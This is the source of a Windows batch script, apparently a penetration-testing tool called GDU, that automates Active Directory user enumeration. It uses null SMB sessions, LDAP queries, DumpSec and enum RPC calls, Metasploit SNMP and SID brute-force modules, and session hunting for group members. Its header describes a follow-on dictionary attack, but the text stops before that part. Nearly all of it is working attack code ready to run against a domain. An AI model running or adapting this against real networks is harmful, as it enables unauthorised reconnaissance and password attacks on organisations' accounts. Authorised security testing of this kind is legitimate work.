<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>GDU.bat</title>
</head><body>@ECHO off<br/>
CLS<br/>
<br/>
REM #################################################################<br/>
REM # Author and Stuff<br/>
REM #################################################################<br/>
REM # Script Name: Get Domain Users (GDU)<br/>
REM # Author: Scott Sutherland (nullbind) &lt;scott.sutherland@netspi.com&gt;<br/>
REM # Version: 1.2<br/>
REM #<br/>
REM # Description:<br/>
REM # This script is intended to automate Windows domain user <br/>
REM # enumeration using multiple methods, and initiate a <br/>
REM # dictionary attack against the accounts with respect to the <br/>
REM # acccount lockout policy.<br/>
REM #<br/>
REM # Technical Summary:<br/>
REM # 1) Determine domain from IPCONFIG (option provided to override)<br/>
REM	# 2) Identify domain controllers via DNS server queries<br/>
REM # 3) Enumerate users via RCP endpoints with Dumpsec<br/>
REM # 4) Enumerate users via RCP endpoints with Enum<br/>
REM # 5) Enumerate users via RCP SID Brute forcing with the Metasploit<br/>
REM #  smb_lookupsid module<br/>
REM # 6) Enumerate users via SNMP default strings with the Metasploit<br/>
REM #  snmp_enumusers module<br/>
REM # 7) Enumerate password policy with Dumpsec<br/>
REM # 8) Conduct dictionary attack using top 20 rockyou password list <br/>
REM #  against enumerated users with Metasploit smb_login module <br/>
REM #  with respect to the password policy<br/>
REM #		<br/>
REM # Authentication Methods:<br/>
REM # Users can authenticate with one of three options during attack.<br/>
REM # 1) Null SMB Login<br/>
REM # 2) Trusted connection<br/>
REM # 3) Username and password<br/>
REM #<br/>
REM # Notes:<br/>
REM # 1) If no lockout policy exists, the dictionary attack will be <br/>
REM #  aborted so it can be manually confirmed<br/>
REM # 2)If the lockout policy cannot be determined the dicitonary<br/>
REM #  attack will be aborted<br/>
REM #################################################################<br/>
<br/>
<br/>
REM -----------------------------------------------------------------<br/>
REM TODO<br/>
REM -----------------------------------------------------------------<br/>
REM - Add other authentication methods for sessions enumeration<br/>
REM - Fix each enumeration method so they stop on first success (dumpsec finished, the rest are pending)<br/>
REM - Add fast/comprehensive modes (added by needs testing)<br/>
REM - Add custom dictionary option<br/>
REM - Add check for required executables before running<br/>
REM -----------------------------------------------------------------<br/>
<br/>
REM -------------------------------------------------------<br/>
REM PRE RUN CONFIGURATION OPTIONS<br/>
REM -------------------------------------------------------<br/>
REM ## SETUP EXECUTABLES PATHS<br/>
SET unixtoolspath=&quot;C:\unixtools\&quot;<br/>
SET metasploitpath=&quot;C:\metasploit\&quot;<br/>
SET enumpath=&quot;C:\Penetration Testing\Enum+\Enum+\enum.exe&quot;<br/>
SET dumpsecpath=&quot;C:\Program Files (x86)\SystemTools\dumpsec.exe&quot;<br/>
<br/>
REM ## SETUP AUTHENTICATION VARIABLES<br/>
SET netuse_auth=&quot;&quot; /user:&quot;&quot;<br/>
SET enumauth=<br/>
<br/>
REM ## SETUP CUSTOM DOMAIN (NOT ASSOCIATED WITH DHCP)<br/>
REM ## Example: SET custom_domain=company.local<br/>
IF [%2] equ [-c] SET custom_domain=%3<br/>
IF [%6] equ [-c] SET custom_domain=%7<br/>
IF [%7] equ [-c] SET custom_domain=%8<br/>
<br/>
<br/>
REM ## SETUP COMMAND LINE SWITCHES<br/>
IF [%1] equ [] goto :SYNTAX<br/>
IF [%1] equ [-g] goto :AUTHENTICATE<br/>
IF [%1] equ [-n] goto :NULLSESSION<br/>
IF [%1] equ [-a] goto :AUTHENTICATE<br/>
IF [%1] equ [-t] goto :TRUSTEDCON<br/>
<br/>
:SYNTAX<br/>
ECHO.<br/>
ECHO ====================================================================================<br/>
ECHO    GET DOMAIN USERS (GDU) v.1.2 - Author: scott.sutherland@netspi.com (nullbind)<br/>
ECHO.<br/>
ECHO        https://github.com/nullbind/Other-Projects/tree/master/GDU<br/>
ECHO ====================================================================================<br/>
ECHO.<br/>
ECHO  This script is intended to automate Windows domain user enumeration using multiple <br/>
ECHO  methods (LDAP,RPC,and SNMP). It also includes options to automatically initiate a <br/>
ECHO  dictionary attack against enumerated accounts under the constraints of the acccount <br/>
ECHO  lockout policy. <br/>
ECHO.<br/>
ECHO  Syntax: gdu [options]<br/>
ECHO.<br/>
ECHO  Options:<br/>
ECHO.<br/>
ECHO  -n Authenticate with a null SMB login<br/>
ECHO  -t Authenticate with a trusted connection (current user)<br/>
ECHO  -a Authenticate with a supplied credentials<br/>
ECHO  -u User name to authenticate with<br/>
ECHO  -p Password to authenticate with<br/>
ECHO  -g Domain group name for finding active member sessions<br/>
ECHO  -c Custom domain<br/>
ECHO.<br/>
ECHO  Examples (basic):<br/>
ECHO. <br/>
ECHO  gdu -n 							<br/>
ECHO  gdu -t<br/>
ECHO  gdu -a -u &quot;domain\user&quot; -p password<br/>
ECHO  gdu -g &quot;group name&quot; -u &quot;domain\user&quot; -p password <br/>
ECHO.<br/>
ECHO  Examples (custom domain):<br/>
ECHO.<br/>
ECHO  gdu -n -c domain.com							<br/>
ECHO  gdu -t -c domain.com<br/>
ECHO  gdu -a -u &quot;domain\myuser&quot; -p mypassword -c domain.com<br/>
ECHO  gdu -g &quot;group name&quot; -u &quot;domain\user&quot; -p password -c domain.com<br/>
ECHO.<br/>
GOTO :END<br/>
<br/>
:AUTHENTICATE<br/>
IF [%5] equ [] ECHO Missing username or password &amp;&amp; goto :END<br/>
SET enumauth=-u %3 -p %5<br/>
SET netuse_auth=/user:%3 %5<br/>
IF [%1] equ [-g] SET enumauth=-u %4 -p %6<br/>
IF [%1] equ [-g] SET netuse_auth=/user:%4 %6<br/>
IF [%1] equ [-g] SET attack=N &amp;&amp; GOTO :DHCP<br/>
GOTO :NULLSESSION<br/>
<br/>
:TRUSTEDCON<br/>
SET netuse_auth=<br/>
GOTO :NULLSESSION<br/>
<br/>
:NULLSESSION<br/>
REM ## CHECK IF USERS WOULD LIKE TO AUTO EXEC A DICTIONARY ATTACK<br/>
ECHO Would you like the dictionary attack to auto execute?<br/>
set /p attack=Y/N (default N):<br/>
IF %attack% equ y set attack=Y <br/>
SET attack=N <br/>
<br/>
ECHO Would you like to enabled quick mode?<br/>
set /p quickmode=Y/N (default N):<br/>
IF %quickmode% equ N GOTO :DHCP<br/>
IF %quickmode% equ y set attack=Y &amp;&amp; GOTO :DHCP<br/>
IF %quickmode% equ Y GOTO :DHCP<br/>
SET quickmode=N &amp;&amp; GOTO :DHCP<br/>
<br/>
<br/>
:DHCP<br/>
REM ## DISPLAY BANNER<br/>
cls<br/>
ECHO.<br/>
ECHO ====================================================================================<br/>
ECHO    GET DOMAIN USERS (GDU) v.1.2 - Author: scott.sutherland@netspi.com (nullbind)<br/>
ECHO.<br/>
ECHO        https://github.com/nullbind/Other-Projects/tree/master/GDU<br/>
ECHO ====================================================================================<br/>
ECHO                Enumerating Domain Users         <br/>
ECHO ------------------------------------------------------------------------------------<br/>
REM -------------------------------------------------------<br/>
REM GET CURRENT DOMAIN FROM IPCONFIG DHCP CONFIGURATION<br/>
REM -------------------------------------------------------<br/>
IF [%1] equ [-n] ECHO [*]  INFO: Authentication method = NULLSESSION<br/>
IF [%1] equ [-a] ECHO [*]  INFO: Authentication method = AUTHENTICATED USER<br/>
IF [%1] equ [-g] ECHO [*]  INFO: Authentication method = AUTHENTICATED USER<br/>
IF [%1] equ [-t] ECHO [*]  INFO: Authentication method = TRUSTED CONNECTION<br/>
IF %attack% equ N ECHO [*]  INFO: Dictionary attack DISABLED<br/>
IF %attack% equ Y ECHO [*]  INFO: Dictionary attack ENABLED<br/>
ECHO [*] ACTION: Getting domain from DHCP configuration...<br/>
<br/>
REM ## PARSE DOMAIN FROM IPCONFIG<br/>
ipconfig | find /I &quot;.&quot; | find /I &quot;Connection-specific DNS Suffix . : &quot; | gawk -F &quot; &quot; &quot;{print $6}&quot; | find /v &quot; &quot; | sort | uniq | find /I &quot;.&quot;|sed -e &quot;s/^[ \]*//&quot; &gt;target<br/>
SET /p target_domain= &lt; target<br/>
IF EXIST target del target<br/>
<br/>
REM ## SETUP CUSTOM DOMAIN IF VARIABLE HAS BEEN SET<br/>
IF [%target_domain%] equ [] ECHO [-] RESULT: FAILED &amp;&amp; GOTO :END<br/>
<br/>
IF [%custom_domain%] neq [] SET target_domain=%custom_domain% <br/>
ECHO [*] RESULT: %target_domain%<br/>
<br/>
REM ## CHECKING TOTAL NUMBER OF WORDS IN A DOMAIN AND SAVE AS TOTALVAR <br/>
IF EXIST num_words del num_words<br/>
echo %target_domain%| gawk -F &quot;.&quot; &quot;{ total = total + NF }; END { print total+0 }&quot; &gt; num_words<br/>
SET /p totalvar= &lt; num_words<br/>
IF EXIST num_words DEL num_words<br/>
<br/>
REM ## DEFINE DOMAIN PARAMETER TO BE USED LATER (e.g: var1=hacking, var2=lab, var3=local)<br/>
IF EXIST domainname del domainname<br/>
FOR /L %%G IN (1,1,%totalvar%) DO (echo %target_domain% | gawk -F &quot;.&quot; &quot;{print $%%G}&quot; &gt; %%G<br/>
SET /p var%%G= &lt; %%G<br/>
gawk &quot;BEGIN { while (a++&lt;1) s=s \&quot;dc=%%var%%G%%\&quot;; print s }&quot; &gt;&gt; domainname<br/>
DEL %%G )<br/>
<br/>
REM ## PARSING DOMAIN VARIABLES FOR THE domain_parameters (e.g: dc=%var1%,dc=%var2%,dc=%var3%)<br/>
IF EXIST domainname_var del domainname_var<br/>
gawk &quot;NR==1{x=$0;next}NF{x=x\&quot;,\&quot;$0}END{print x}&quot; domainname &gt; domainname_var<br/>
DEL domainname<br/>
<br/>
REM ## FIX PARSING ISSUES<br/>
IF EXIST domainname_var2 del domainname_var2<br/>
SET /p temp_var= &lt; domainname_var<br/>
@echo %temp_var% | sed &quot;s/'//&quot; &gt; domainname_var2<br/>
SET /p domain_parameter= &lt; domainname_var2<br/>
IF EXIST domainname_var DEL domainname_var <br/>
IF EXIST domainname_var2 DEL domainname_var2<br/>
<br/>
<br/>
REM -------------------------------------------------------<br/>
REM ENUMERATE DOMAIN CONTROLLERS WITH NSLOOKUP<br/>
REM -------------------------------------------------------<br/>
ECHO [*] ACTION: Getting list of DCs from DNS...<br/>
<br/>
REM ## ENUMERATE DOMAIN CONTROLLERS<br/>
nslookup -type=SRV _ldap._tcp.%target_domain% 2&gt;nul| find /I &quot;internet address&quot; | gawk -F &quot; &quot; &quot;{print $5}&quot; | uniq | sort &gt; dcs.txt 2&gt; NUL <br/>
<br/>
REM ## CHECK IF DOMAIN CONTROLLERS ARE UP<br/>
for /F &quot;tokens=*&quot; %%i in ('cat dcs.txt') do ping -n 2 %%i | grep -i &quot;reply&quot; | grep -i &quot;bytes=&quot; | gawk -F &quot; &quot; &quot;{print $3}&quot;| sed s/://g | uniq &gt;&gt; dcs_live.txt<br/>
<br/>
REM ## UPDATE DC LIST<br/>
sort dcs_live.txt&gt;dcs.txt<br/>
<br/>
REM ## REMOVE TEMP FILE<br/>
IF EXIST dcs_live.txt DEL dcs_live.txt<br/>
<br/>
REM ## GET DOMAIN CONTROLLER COUNT<br/>
wc -l dcs.txt | sed s/dcs.txt//g | sed -e &quot;s/^[ \]*//&quot; &gt; dc_count<br/>
SET /P dc_count=&lt;dc_count<br/>
IF EXIST dc_count del dc_count<br/>
if %dc_count% LEQ 0 ECHO [-] RESULT: FAILED &amp;&amp; GOTO :END<br/>
<br/>
REM ## PRINT NUMBER OF DOMAIN CONTROLLERS<br/>
ECHO [*] RESULT: Found %dc_count%domain controllers<br/>
<br/>
REM ## PRINT LIST OF DOMAIN CONTROLLERS<br/>
for /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do ECHO [*]   DC: %%i<br/>
<br/>
<br/>
REM -------------------------------------------------------<br/>
REM CREATE SMB SESSION TO DCs WITH NET USE<br/>
REM -------------------------------------------------------<br/>
REM ## Establish smb login to each domain controller via native net use command<br/>
IF [%1] equ [-n] ECHO [*] ACTION: Establishing null SMB login to each DC...<br/>
IF [%1] equ [-a] ECHO [*] ACTION: Establishing authenticated login to each DC as %3...<br/>
IF [%1] equ [-g] ECHO [*] ACTION: Establishing authenticated login to each DC as %4...<br/>
<br/>
FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do net use \\%%i\IPC$ %netuse_auth% 1&gt;nul<br/>
<br/>
IF [%1] equ [-g] GOTO :GETGROUPSESS<br/>
GOTO :LDAP<br/>
<br/>
<br/>
:GETGROUPSESS<br/>
REM ## CHECK FOR REQUIRED VARIABLES<br/>
IF [%2] equ [] ECHO MISSING GROUP NAME<br/>
IF [%4] equ [] ECHO MISSING USERNAME FOR AUTHENTICATION<br/>
IF [%6] equ [] ECHO M<br/>
<br/>
REM -------------------------------------------------------<br/>
REM GET ACTIVE SESSIONS OF DOMAIN GROUP MEMBERS<br/>
REM -------------------------------------------------------<br/>
<br/>
REM ## GET MEMBER NAMES FOR THE GROUP<br/>
ECHO [*] ACTION: Sending LDAP query for list of %2 group members...<br/>
@AdFind.exe -b %domain_parameter% -f name=%2 member -list | gawk -F &quot;CN=&quot; &quot;{print $2}&quot; | sed s/,//g 2&gt;nul 1&gt;group_tmp.txt<br/>
<br/>
REM ## GET LOGIN FOR EACH USER<br/>
REM ECHO [*] ACTION: Parsing group member names...<br/>
FOR /f &quot;tokens=1 delims=&quot; %%a IN ('type group_tmp.txt') do @adfind -b %domain_parameter% -f name=&quot;%%a&quot; | grep -i &quot;sAMAccountName&quot; | sed -e s/^&gt;sAMAccountName:&quot; &quot;//g &gt;&gt; group_members.txt<br/>
	<br/>
REM ## GET ACTIVE SESSIONS FOR GROUP MEMBERS<br/>
ECHO [*] ACTION: Querying domain controllers for active sessions...<br/>
for /f &quot;tokens=*&quot; %%a in ('type dcs.txt') do NetSess.exe %%a &gt;&gt; sessions_tmp.txt <br/>
<br/>
REM ## SEARCH SESSIONS FOR ACTIVE GROUP MEMBER SESSIONS<br/>
ECHO [*] ACTION: Searching sessions for group members...<br/>
for /f &quot;tokens=*&quot; %%a in ('type group_members.txt') do grep -i %%a sessions_tmp.txt &gt;&gt; group_sess_tmp.txt<br/>
sort group_sess_tmp.txt | uniq &gt; group_sess_final.txt<br/>
<br/>
REM ## GET COUNT OF ACTIVE SESSIONS<br/>
wc -l group_sess_final.txt | sed s/group_sess_final.txt//g | sed -e &quot;s/^[ \]*//&quot; &gt; sess_count.txt<br/>
SET /P sess_count=&lt;sess_count.txt<br/>
if %sess_count% LEQ 0 ECHO [-] RESULT: No active sessions found.<br/>
<br/>
REM ## DISPLAY NUMBER OF ACTIVE GROUP SESSIONS<br/>
ECHO [*] RESULT: %sess_count%session(s) were found!<br/>
<br/>
REM ## DISPLAY LIST OF ACTIVE GROUP MEMBER SESSIONS<br/>
for /f &quot;tokens=*&quot; %%a in ('type group_sess_final.txt') do ECHO [*] SESSION: %%a<br/>
<br/>
REM ## CLEAN UP FILES<br/>
IF EXIST group_tmp.txt DEL group_tmp.txt<br/>
IF EXIST group_members.txt DEL group_members.txt<br/>
IF EXIST sessions_tmp.txt DEL sessions_tmp.txt <br/>
IF EXIST group_sess_tmp.txt DEL group_sess_tmp.txt<br/>
IF EXIST sess_count.txt DEL sess_count.txt<br/>
<br/>
GOTO :END<br/>
<br/>
<br/>
:LDAP<br/>
REM -------------------------------------------------------<br/>
REM USER ENUMERATED WITH ADFIND (LDAP)<br/>
REM -------------------------------------------------------<br/>
<br/>
REM ## DETERMINE IF LDAP SHOULD BE USED<br/>
IF [%1] equ [-n] ECHO [*]  INFO: LDAP doesn't support null SMB login &amp;&amp; GOTO :DUMPSEC<br/>
ECHO [*] ACTION: Attempting user enumeration with LDAP...<br/>
<br/>
REM ## GET LIST OF USERS &amp; PARSE INTO FILE<br/>
@adfind -b %domain_parameter% -f &quot;objectcategory=user&quot; -gc | grep -i &quot;sAMAccountName:&quot; | gawk -F &quot;:&quot; &quot;{print $2}&quot; | gawk -F &quot; &quot; &quot;{print $1}&quot;| gawk &quot;!/\$/&quot;| uniq | sort 2&gt;nul 1&gt; allusers.txt<br/>
<br/>
REM ## GET USER COUNT<br/>
wc -l allusers.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/allusers.txt//g | uniq&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## CLEAN UP COUNT FILES<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_ldap.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
IF %user_count% EQU 0 ECHO [-] RESULT: FAILED &amp;&amp; GOTO :DUMPSEC<br/>
<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO [*] RESULT: Enumerated %user_count%users (domain_users_ldap.txt)<br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :DUMPSEC<br/>
<br/>
<br/>
:DUMPSEC<br/>
REM -------------------------------------------------------<br/>
REM USER ENUMERATED WITH DUMPSEC (RPC ENDPOINTS)<br/>
REM -------------------------------------------------------<br/>
ECHO [*] ACTION: Attempting user enumeration via RPC ENDPOINTS(DUMPSEC)...<br/>
<br/>
REM ## GET LIST OF USERS FROM EVERY DC<br/>
REM FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2&gt; nul<br/>
<br/>
REM ## GET LIST OF USERS FROM EVERY DC - STOP ON FIRST SUCCESS<br/>
FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2&gt; nul &amp;&amp; cat *_usrs.txt| gawk -F &quot;,&quot; &quot;{print $1}&quot; | find /V &quot;Somarsoft DumpSec&quot;| find /V &quot;NetQueryDisplayInformation&quot;| find /V &quot;UserName&quot; | grep -v &quot;^$&quot; | grep -v &quot;,&quot; | sort | uniq &gt; allusers.txt &amp;&amp; wc -l allusers.txt| sed -e &quot;s/^[ \]*//&quot; | sed s/allusers.txt//g&gt;user_count &amp;&amp; SET /P user_count=&lt;user_count &amp;&amp; IF %user_count% GEQ 10 move allusers.txt domain_users_rpc_dumpsec.txt 2&gt;nul 1&gt;nul &amp;&amp; IF EXIST %%i_usrs.txt del %%i_usrs.txt &amp;&amp; GOTO :DUMPSECE<br/>
<br/>
REM ## PARSE CLEAN LIST OF USERS<br/>
cat *_usrs.txt| gawk -F &quot;,&quot; &quot;{print $1}&quot; | find /V &quot;Somarsoft DumpSec&quot;| find /V &quot;NetQueryDisplayInformation&quot;| find /V &quot;UserName&quot; | grep -v &quot;^$&quot; | grep -v &quot;,&quot; | sort | uniq &gt; allusers.txt<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do del %%i_usrs.txt<br/>
<br/>
REM ## GET USER COUNT<br/>
wc -l allusers.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_rpc_dumpsec.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
IF %user_count% LEQ 1 ECHO [-] RESULT: FAILED &amp;&amp; GOTO :ENUMN<br/>
<br/>
:DUMPSECE<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO [*] RESULT: Enumerated %user_count%users (domain_users_rpc_dumpsec.txt)<br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :ENUMN<br/>
<br/>
<br/>
:ENUMN<br/>
REM -------------------------------------------------------<br/>
REM Run enum -N to enumerate users (RPC ENDPOINTS)<br/>
REM -------------------------------------------------------<br/>
ECHO [*] ACTION: Attempting user enumeration via RPC ENDPOINTS(ENUM -N)...<br/>
<br/>
REM ## GET LIST OF USERS<br/>
IF [%1] equ [-t] FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do %enumpath% -N %%i &gt;&gt; allusers.txt<br/>
IF [%1] equ [-n] FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do %enumpath% -N %enumauth% %%i &gt;&gt; allusers.txt<br/>
IF [%1] equ [-a] FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do %enumpath% -N %enumauth% %%i &gt;&gt; allusers.txt<br/>
<br/>
REM ## PARSE CLEAN LIST OF USERS<br/>
grep -i &quot;(pass 1)... got&quot; allusers.txt| wc -l | sed -e &quot;s/^[ \]*//&quot; &gt; checkit<br/>
SET /P success=&lt;checkit<br/>
IF EXIST checkit del checkit<br/>
IF %success% EQU 0 ECHO [-] RESULT: FAILED &amp;&amp; GOTO :SNMPENUM<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $1}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $2}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $3}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $4}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $5}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $6}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $7}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $8}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $9}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
grep -v &quot;connected as&quot; allusers.txt | grep -v &quot;:&quot; | grep -v &quot;getting namelist&quot; | grep -v &quot;Cleaning up&quot; | grep -v &quot;setting up session&quot; | grep -v &quot;success.&quot; | grep -v &quot;server:&quot; | gawk -F &quot; &quot; &quot;{print $10}&quot; | sort | uniq &gt;&gt; clean.txt<br/>
cat clean.txt | grep -v &quot;\$&quot; | grep -v &quot;^$&quot; | grep -v &quot;,&quot; | sed -e &quot;s/^[ \]*//&quot; | sort | uniq &gt; allusers.txt<br/>
IF EXIST clean.txt del clean.txt<br/>
<br/>
REM ## GET USER COUNT<br/>
wc -l allusers.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_rpc_enum.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
IF %user_count% EQU 0 ECHO [-] RESULT: FAILED &amp;&amp; GOTO :SNMPENUM<br/>
<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO [*] RESULT: Enumerated %user_count%users (domain_users_rpc_enum.txt) <br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :SNMPENUM<br/>
<br/>
<br/>
:SNMPENUM<br/>
REM ----------------------------------------------------------------------<br/>
REM ENUMERATE USERS WITH SNMP_ENUMUSERS (SNMP)<br/>
REM -----------------------------------------------------------------------<br/>
ECHO [*] ACTION: Attempting user enumeration via SNMP Public string...<br/>
<br/>
REM ## GET LIST OF USERS<br/>
REM FOR /F &quot;tokens=*&quot; %%i in ('type dcs.txt') do ruby c:\metasploit\msf3\msfcli auxiliary/scanner/snmp/snmp_enumusers COMMUNITY=Public RHOSTS=%%i E 2&gt; nul 1&gt;&gt; usrtmp.txt &amp;&amp;<br/>
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/snmp/snmp_enumusers COMMUNITY=Public RHOSTS=file:%mypwd%\\dcs.txt E 2&gt; nul 1&gt;&gt; usrtmp.txt<br/>
<br/>
REM ## PARSE CLEAN LIST OF USERS<br/>
grep -i &quot;Found Users:&quot; usrtmp.txt | gawk -F &quot;Found Users:&quot; &quot;{print $2}&quot; | tr , \n | sed -e &quot;s/^[ \]*//&quot; | sort | uniq 2&gt;nul 1&gt; allusers.txt<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST usrtmp.txt del usrtmp.txt<br/>
<br/>
REM ## GET NUMBER OF ENUMERATED USERS<br/>
wc -l allusers.txt | sed -e &quot;s/^[ \]*//&quot; | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_snmp.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
if %user_count% LEQ 1 ECHO [-] RESULT: FAILED &amp;&amp; GOTO :SIDENUM<br/>
<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO [*] RESULT: Enumerated %user_count%users (domain_users_snmp.txt) <br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :SIDENUM<br/>
<br/>
<br/>
:SIDENUM<br/>
REM -------------------------------------------------------<br/>
REM ENUMERATE USERS WITH SMB_LOOKUPSID (RPC SID Brute Force)<br/>
REM -------------------------------------------------------<br/>
ECHO [*] ACTION: Attempting user enumeration via RPC SID BF (takes a while)...<br/>
<br/>
REM ## BUILD FILE NAME FILE PATH FOR METASPLOIT VARIABLE<br/>
pwd &gt; pwd.txt<br/>
cat pwd.txt | sed s/\\/\\\\/g &gt; pwd2.txt<br/>
SET /P mypwd=&lt;pwd2.txt<br/>
IF EXIST pwd.txt del pwd.txt<br/>
IF EXIST pwd2.txt del pwd2.txt<br/>
<br/>
copy dcs.txt dclist.txt 2&gt;nul 1&gt;nul<br/>
<br/>
:runsid<br/>
REM ## SETUP NEXT SCAN<br/>
head -n 1 dclist.txt &gt; dc_target.txt<br/>
head -n 1 dclist.txt &gt;&gt; dcs_scanned.txt<br/>
diff -iw -d dclist.txt dcs_scanned.txt | grep -i &quot;&lt;&quot; | grep -v &quot;^$&quot; | sed -e &quot;s/^[ \]*//&quot; | grep -v &quot;\,&quot; | gawk -F &quot; &quot; &quot;{print $2}&quot; &gt; dclist.txt<br/>
<br/>
REM ## GET LIST OF USERS for first server<br/>
